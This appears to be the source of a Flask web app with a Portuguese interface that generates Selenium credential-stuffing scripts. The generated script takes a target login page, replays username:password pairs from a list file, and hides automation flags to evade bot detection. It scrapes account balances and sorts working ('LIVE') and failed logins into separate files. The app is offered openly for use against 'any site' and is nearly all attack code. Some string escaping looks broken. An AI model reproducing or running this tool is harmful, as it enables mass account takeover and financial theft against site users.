import os, sys, json, time, uuid, re, random, secrets, threading
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request
from flask_cors import CORS
import requests as http_requests
from colorama import init, Fore, Style

# Importando configurações
try:
    from config import PORT, SECRET_KEY, MUSIC, CSS
except ImportError:
    # Fallback caso seja executado isoladamente
    PORT = int(os.environ.get('PORT', 5000))
    SECRET_KEY = secrets.token_hex(32)
    MUSIC = ""
    CSS = ""

init(autoreset=True)

app = Flask(__name__)
app.config['SECRET_KEY'] = SECRET_KEY
CORS(app)
os.makedirs('scripts_gerados', exist_ok=True)

class Parser:
    def parse(text):
        lines = text.strip().split('\n')
        steps, first = [], None
        for line in lines:
            line = line.strip()
            if not line: continue
            if line.startswith('http'):
                if not first: first = line
                steps.append({'t':'url','v':line,'d':'Navegar'})
                continue
            if line.startswith('<'):
                p = Parser._tag(line)
                if p: steps.append(p)
        return steps, first

    def _tag(html):
        attrs = dict(re.findall(r'(\w[\w-]*)\s*=\s*"([^"]*)"', html))
        m = re.match(r'<(\w+)', html)
        tag = m.group(1).lower() if m else ''
        if tag not in ['input','button','a','div','span','select','textarea']: return None
        it = attrs.get('type','').lower()
        nm = attrs.get('name','')
        ida = attrs.get('id','')
        ph = attrs.get('placeholder','')
        ac = attrs.get('autocomplete','')
        cl = attrs.get('class','')
        vl = attrs.get('value','')
        tx = re.search(r'>([^<]*)<', html)
        tx = tx.group(1).strip() if tx else ''
        
        if ida and ida not in ['false','']: sel = f"#{ida}"
        elif nm: sel = f"{tag}[name='{nm}']"
        elif ph: sel = f"{tag}[placeholder='{ph}']"
        elif ac: sel = f"{tag}[autocomplete='{ac}']"
        elif vl: sel = f"{tag}[value='{vl}']"
        else: sel = tag
        
        if it == 'hidden': return None
        
        click_words = [
            'btn','button','entrar','login','submit','enviar','acessar','sign',
            'continuar','next','proximo','avançar','confirmar','ok','go','ir',
            'cadastrar','registrar','criar','conta','comprar','pagar','finalizar',
            'fazer','log','in','sing','up','register','create','buy',
            'pay','checkout','order','save','salvar','cancel','cancelar',
            'voltar','back','return','search','buscar','pesquisar','send',
            'entra','acessa','loga','autentica','validar','verificar','confirm',
            'done','pronto','feito','concluir','finaliza','terminei','okay',
            'yes','sim','nao','não','aceitar','concordo','li','aceito',
            'terms','termos','politica','privacidade','continue','prosseguir',
            'subscribe','inscrever','newsletter','promo','cupom','desconto',
            'aplicar','apply','add','adicionar','remove','remover','delete',
            'excluir','edit','editar','update','atualizar','change','alterar',
            'download','upload','baixar','enviar arquivo','choose','escolher',
            'select','selecionar','pick','escolha','browse','procurar',
            'open','abrir','close','fechar','exit','sair','quit',
            'start','iniciar','começar','begin','stop','parar','pause',
            'play','reproduzir','like','gostei','share','compartilhar',
            'follow','seguir','unfollow','deixar de seguir','report','denunciar',
            'block','bloquear','unblock','desbloquear','mute','silenciar',
            'unmute','ativar som','notify','notificar','settings','configurações',
            'preferences','preferências','profile','perfil','account','conta',
            'logout','sair','deslogar','sign out','sign in','sign up',
            'register now','cadastre-se','criar conta','nova conta','faça login',
            'fazer login','log in','log on','entrar agora','acessar conta',
            'minha conta','my account','área do cliente','painel','dashboard',
        ]
        
        combined = f"{cl} {tx} {vl} {nm} {ida} {ph} {ac}".lower()
        
        is_btn = (
            tag == 'button' or
            (tag == 'input' and it in ['submit','button','reset']) or
            (tag == 'a' and tx) or
            (tag == 'div' and tx and any(w in combined for w in click_words)) or
            (tag == 'span' and tx and any(w in combined for w in click_words))
        )
        
        if is_btn:
            dt = tx or vl or 'Click'
            return {'t':'click','s':sel,'x':dt,'d':f'Clicar: {dt[:40]}'}
        
        if tag in ['input','textarea']:
            c = 'user' if it == 'email' or re.search(r'(user|username|login|email|mail|cpf|document)',f"{nm} {ida} {ph} {ac}".lower()) else 'pass' if it == 'password' or re.search(r'(password|senha|pass|pwd)',f"{nm} {ida} {ph} {ac}".lower()) else 'text'
            return {'t':'input','s':sel,'c':c,'d':f'Digitar: {c}'}
        
        if tag == 'select': return {'t':'select','s':sel,'d':'Selecionar'}
        return None

class Gen:
    def generate(steps, name='script.py', url=None):
        L = []
        L.append('#!/usr/bin/env python3')
        L.append('# -*- coding: utf-8 -*-')
        L.append(f'# Auto Coder v1 | Execute: python {name}')
        L.append('import os,sys,time,random,re,json')
        L.append('from datetime import datetime')
        L.append('from selenium import webdriver')
        L.append('from selenium.webdriver.common.by import By')
        L.append('from selenium.webdriver.common.keys import Keys')
        L.append('from selenium.webdriver.chrome.service import Service')
        L.append('from selenium.webdriver.chrome.options import Options')
        L.append('from selenium.webdriver.support.ui import WebDriverWait')
        L.append('from selenium.webdriver.support import expected_conditions as EC')
        L.append('')
        L.append('for p in ["selenium","webdriver-manager","colorama"]:')
        L.append('    try:__import__(p.replace("-","_"))')
        L.append('    except:os.system(f"{sys.executable} -m pip install {p} --quiet")')
        L.append('from webdriver_manager.chrome import ChromeDriverManager')
        L.append('from colorama import init,Fore,Style')
        L.append('init(autoreset=True)')
        L.append('')
        L.append('C=Fore.CYAN;G=Fore.GREEN;R=Fore.RED;Y=Fore.YELLOW;W=Fore.WHITE;M=Fore.MAGENTA;E=Style.RESET_ALL')
        L.append('DB="db.txt";LF="lives.txt";DF="dies.txt"')
        L.append('')
        L.append('def load(f):')
        L.append('    L=[]')
        L.append('    if not os.path.exists(f):return L')
        L.append('    for l in open(f,"r",encoding="utf-8"):')
        L.append('        l=l.strip()')
        L.append('        if l and not l.startswith("#"):')
        L.append('            p=l.split(":")')
        L.append('            if len(p)>=2:L.append({"u":p[0].strip(),"p":":".join(p[1:]).strip()})')
        L.append('    return L')
        L.append('')
        L.append('def th(el,tx):')
        L.append('    for c in tx:el.send_keys(c);time.sleep(random.uniform(0.02,0.08))')
        L.append('def rd(a=0.3,b=1.2):time.sleep(random.uniform(a,b))')
        L.append('')
        L.append('def novo_driver():')
        L.append('    opts=Options()')
        L.append('    opts.add_argument("--no-sandbox")')
        L.append('    opts.add_argument("--disable-dev-shm-usage")')
        L.append('    opts.add_argument("--disable-blink-features=AutomationControlled")')
        L.append('    opts.add_argument("--window-size=1920,1080")')
        L.append('    opts.add_argument("--ignore-certificate-errors")')
        L.append('    opts.add_experimental_option("excludeSwitches",["enable-automation"])')
        L.append('    opts.add_experimental_option("useAutomationExtension",False)')
        L.append('    try:return webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=opts)')
        L.append('    except:return webdriver.Chrome(options=opts)')
        L.append('')
        L.append('def clicar_em_qualquer_botao(driver):')
        L.append('    """Tenta clicar em qualquer botao de submit/login disponivel"""')
        L.append('    botoes=[')
        L.append('        "button[type=\'submit\']",')
        L.append('        "input[type=\'submit\']",')
        L.append('        "button[type=\'button\']",')
        L.append('        "//button[contains(text(),\'Entrar\')]",')
        L.append('        "//button[contains(text(),\'entrar\')]",')
        L.append('        "//button[contains(text(),\'ENTRAR\')]",')
        L.append('        "//button[contains(text(),\'Login\')]",')
        L.append('        "//button[contains(text(),\'login\')]",')
        L.append('        "//button[contains(text(),\'LOGIN\')]",')
        L.append('        "//button[contains(text(),\'Sign\')]",')
        L.append('        "//button[contains(text(),\'Acessar\')]",')
        L.append('        "//button[contains(text(),\'acessar\')]",')
        L.append('        "//button[contains(text(),\'Continuar\')]",')
        L.append('        "//button[contains(text(),\'continuar\')]",')
        L.append('        "//button[contains(text(),\'Enviar\')]",')
        L.append('        "//button[contains(text(),\'enviar\')]",')
        L.append('        "//*[@type=\'submit\']",')
        L.append('        "//*[contains(@class,\'btn\')]",')
        L.append('        "//*[contains(@class,\'button\')]",')
        L.append('        "form button",')
        L.append('        "form input[type=\'submit\']",')
        L.append('    ]')
        L.append('    for sel in botoes:')
        L.append('        try:')
        L.append('            if sel.startswith("//"):')
        L.append('                btn=driver.find_element(By.XPATH,sel)')
        L.append('            else:')
        L.append('                btn=driver.find_element(By.CSS_SELECTOR,sel)')
        L.append('            if btn.is_displayed() and btn.is_enabled():')
        L.append('                driver.execute_script("arguments[0].scrollIntoView(true);",btn)')
        L.append('                rd(0.3,0.7)')
        L.append('                btn.click()')
        L.append('                print(f"{C}[OK] Botao clicado: {sel[:50]}{E}")')
        L.append('                return True')
        L.append('        except:continue')
        L.append('    return False')
        L.append('')
        L.append('def main():')
        L.append('    sep="="*50')
        L.append('    sep2="-"*50')
        L.append('    print(f"{C}LOGIN CHECKER v6{E}")')
        L.append('    print(f"{C}{sep}{E}\\n")')
        L.append('    logins=load(DB)')
        L.append('    if not logins:')
        L.append('        print(f"{R}[!] Nenhum login em {DB}{E}")')
        L.append('        print(f"{Y}[*] Formato: usuario:senha{E}");return')
        L.append('    print(f"{C}[*] {len(logins)} logins{E}\\n")')
        L.append('    lives,dies=[],[]')
        L.append('    for i,lg in enumerate(logins,1):')
        L.append('        t1=datetime.now()')
        L.append('        cs=f"{lg[\'u\']}:{lg[\'p\']}"')
        L.append('        print(f"\\n{C}[{i}/{len(logins)}] {lg[\'u\']}{E}")')
        L.append('        print(f"{C}{sep2}{E}")')
        L.append('')
        L.append('        driver=novo_driver()')
        L.append('')

        for s in steps:
            if s['t'] == 'url':
                L.append(f'        driver.get("{s["v"]}")')
                L.append('        rd(2,4)')
                L.append('')
            elif s['t'] == 'input':
                sel = s['s']
                cat = s['c']
                L.append(f'        try:')
                L.append(f'            el=WebDriverWait(driver,15).until(EC.presence_of_element_located((By.CSS_SELECTOR,"{sel}")))')
                L.append('            driver.execute_script("arguments[0].scrollIntoView(true);",el)')
                L.append('            rd(0.3,0.7)')
                L.append('            el.click()')
                L.append('            el.clear()')
                L.append('            rd(0.2,0.5)')
                if cat == 'user':
                    L.append('            th(el,lg["u"])')
                elif cat == 'pass':
                    L.append('            th(el,lg["p"])')
                else:
                    L.append('            el.send_keys("test")')
                L.append('        except:pass')
                L.append('')
            elif s['t'] == 'click':
                sel = s['s']
                tx = s.get('x','Click')
                L.append(f'        try:')
                if sel.startswith('//'):
                    L.append(f'            btn=WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.XPATH,"{sel}")))')
                else:
                    L.append(f'            btn=WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"{sel}")))')
                L.append('            driver.execute_script("arguments[0].scrollIntoView(true);",btn)')
                L.append('            rd(0.3,0.8)')
                L.append('            btn.click()')
                L.append('        except:pass')
                L.append('')

        L.append('        # Tentar clicar em qualquer botao de submit/login')
        L.append('        clicar_em_qualquer_botao(driver)')
        L.append('')
        L.append('        # Resposta')
        L.append('        rd(3,5)')
        L.append('        t2=datetime.now()')
        L.append('        ts=round((t2-t1).total_seconds(),1)')
        L.append('        try:pt=driver.find_element(By.TAG_NAME,"body").text')
        L.append('        except:pt=driver.page_source')
        L.append('        pl=pt.lower()')
        L.append('')
        L.append('        saldo=""')
        L.append('        for padrao in [r\'R\\\\$\\\\s*[\\\\d.,]+\',r\'\\\\d+[.,]\\\\d{2}\',r\'saldo[^\\\\n]*\',r\'balance[^\\\\n]*\',r\'credits[^\\\\n]*\',r\'pontos[^\\\\n]*\']:')
        L.append('            m=re.search(padrao,pt,re.IGNORECASE)')
        L.append('            if m:saldo=m.group(0)[:30];break')
        L.append('')
        L.append('        erro=""')
        L.append('        for padrao in [r\'incorrect[^\\\\n]*\',r\'invalid[^\\\\n]*\',r\'error[^\\\\n]*\',r\'wrong[^\\\\n]*\',r\'fail[^\\\\n]*\',r\'inv\u00e1lido[^\\\\n]*\',r\'incorreto[^\\\\n]*\',r\'n\u00e3o encontrado[^\\\\n]*\']:')
        L.append('            m=re.search(padrao,pt,re.IGNORECASE)')
        L.append('            if m:erro=m.group(0)[:40];break')
        L.append('        if not erro:erro=pt[:40].replace("\\n"," ").strip()')
        L.append('')
        L.append('        ok=["welcome","bem-vindo","bem vindo","dashboard","painel","minha conta","my account","logado","logout","sair","success","sucesso"]')
        L.append('        fl=["incorrect","incorreto","invalid","invalido","error","erro","wrong","fail","falha"]')
        L.append('')
        L.append('        if any(w in pl for w in ok):')
        L.append('            msg=saldo if saldo else "LOGADO COM SUCESSO"')
        L.append('            print(f"{G}LIVE ~> {cs} ~> {msg} ~> @cybersecofc ~> {ts}s{E}")')
        L.append('            lives.append(cs)')
        L.append('        elif any(w in pl for w in fl):')
        L.append('            msg=erro if erro else "LOGIN INVALIDO"')
        L.append('            print(f"{R}DIE ~> {cs} ~> {msg} ~> @cybersecofc ~> {ts}s{E}")')
        L.append('            dies.append(cs)')
        L.append('        else:')
        L.append('            print(f"{Y}UNKNOWN ~> {cs} ~> {erro} ~> @cybersecofc ~> {ts}s{E}")')
        L.append('            dies.append(cs)')
        L.append('')
        L.append('        driver.quit()')
        L.append('')
        L.append('    for fn,data in [(LF,lives),(DF,dies)]:')
        L.append('        with open(fn,"w",encoding="utf-8") as f:')
        L.append('            for d in data:f.write(d+"\\n")')
        L.append('    print(f"\\n{C}{sep}{E}")')
        L.append('    print(f"{C}{G}{{len(lives)}} LIVES{C} | {R}{{len(dies)}} DIES{E}")')
        L.append('    print(f"{C}{sep}{E}")')
        L.append('    print(f"\\n{M}@cybersecofc{E}")')
        L.append('if __name__=="__main__":')
        L.append('    try:main()')
        L.append('    except KeyboardInterrupt:print(f"\\n{Y}[!] Fim{E}")')
        return '\n'.join(L)

PAGE = f"""<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Auto Coder v6</title>{{CSS}}</head><body>
<iframe src="{{MUSIC}}" allow="autoplay" style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0;border:none;pointer-events:none" id="mf"></iframe>
<script>setInterval(function(){{try{{document.getElementById('mf').contentWindow.postMessage('{{"event":"command","func":"playVideo","args":""}}','*');}}catch(e){{}}}},3000);</script>
<div class="app"><div class="header"><div class="logo">AUTO CODER v1</div><div class="subtitle">CLIQUE INTELIGENTE</div><div class="badge-row"><span class="badge badge-p">Selenium</span><span class="badge badge-g">Login</span><span class="badge badge-a">Qualquer Site</span></div></div>
<div class="card"><div class="card-title">🔑 Gerador de Script</div><div class="card-desc"><b>Como usar:</b><br>1. Cole <b>URL</b> do site<br>2. Cole <b>campos HTML</b><br>3. Clique <b>GERAR</b><br>4. Logins em <b>db.txt</b> (login:senha)<br>5. Execute: <code>python script.py</code></div>
<form id="f"><div class="form-group"><label class="form-label">URL + Campos HTML</label><textarea id="st" class="form-input" placeholder="Cole aqui...&#10;&#10;Exemplo:&#10;https://www.zema.com/login&#10;<input id=&quot;username&quot;>&#10;<input type=&quot;password&quot; id=&quot;password&quot;>&#10;<button>Entrar</button>"></textarea></div>
<div class="form-group"><label class="form-label">Nome do Arquivo</label><input type="text" id="nm" class="form-input" value="login_checker.py"></div>
<div style="display:flex;gap:10px"><button type="submit" class="btn btn-p">⚡ GERAR</button><button type="button" class="btn btn-s" onclick="dl()">📥 BAIXAR</button></div></form><div id="mg" style="margin-top:15px"></div></div>
<div class="card" id="pv" style="display:none"><div class="card-title">Script Gerado</div><div class="code-block" id="cd"></div><div id="sl" style="margin-top:15px"></div></div></div>
<script>
var sc='';var fn='login_checker.py';
document.getElementById('f').addEventListener('submit',async function(e){{
e.preventDefault();
document.getElementById('mg').innerHTML='<div class="alert alert-i">Gerando...</div>';
fn=document.getElementById('nm').value||'login_checker.py';
try{{
var r=await fetch('/api/generate',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{steps:document.getElementById('st').value,script_name:fn}})}});
var d=await r.json();
if(d.success){{
sc=d.script;
document.getElementById('mg').innerHTML='<div class="alert alert-s">Script com '+d.steps_count+' passos!</div>';
document.getElementById('pv').style.display='block';
document.getElementById('cd').textContent=sc;
if(d.parsed_steps){{
var h='<h4 style="color:var(--p)">Passos:</h4><div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:10px">';
d.parsed_steps.forEach(function(s,i){{h+='<span class="badge badge-p">'+(i+1)+'. '+s.d+'</span>';}});
h+='</div>';
document.getElementById('sl').innerHTML=h;
}}
document.getElementById('pv').scrollIntoView({{behavior:'smooth'}});
}}else{{
document.getElementById('mg').innerHTML='<div class="alert alert-e">'+d.message+'</div>';
}}
}}catch(e){{
document.getElementById('mg').innerHTML='<div class="alert alert-e">Erro: '+e.message+'</div>';
}}
}});
function dl(){{if(!sc){{alert('Gere primeiro!');return;}}var b=new Blob([sc],{{type:'text/python'}});var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=fn;a.click();}}
</script></body></html>"""

@app.route('/')
def home(): return PAGE

@app.route('/api/generate', methods=['POST'])
def api_gen():
    d = request.json
    txt = d.get('steps','')
    nm = d.get('script_name','script.py')
    if not txt.strip(): return jsonify({'success':False,'message':'Cole algo!'})
    steps, url = Parser.parse(txt)
    useful = [s for s in steps if s['t'] in ['url','input','click']]
    if not useful: return jsonify({'success':False,'message':'Nada detectado!'})
    script = Gen.generate(useful, nm, url)
    with open(f'scripts_gerados/{{nm}}','w',encoding='utf-8') as f: f.write(script)
    descs = [{'d':s.get('d',s['t'])} for s in useful]
    return jsonify({'success':True,'message':'OK','script':script,'steps_count':len(useful),'parsed_steps':descs})

@app.route('/ping')
def ping(): return jsonify({'status':'online'})

def ka():
    while True:
        try: http_requests.get(f"http://localhost:{{PORT}}/ping", timeout=10)
        except: pass
        time.sleep(240)

def run_bot():
    threading.Thread(target=ka, daemon=True).start()
    print(f"\n{{Fore.CYAN}}AUTO CODER v1 - CLIQUE INTELIGENTE{{Style.RESET_ALL}}")
    print(f"{{Fore.WHITE}}http://localhost:{{PORT}}{{Style.RESET_ALL}}\n")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)

if __name__ == '__main__':
    run_bot()
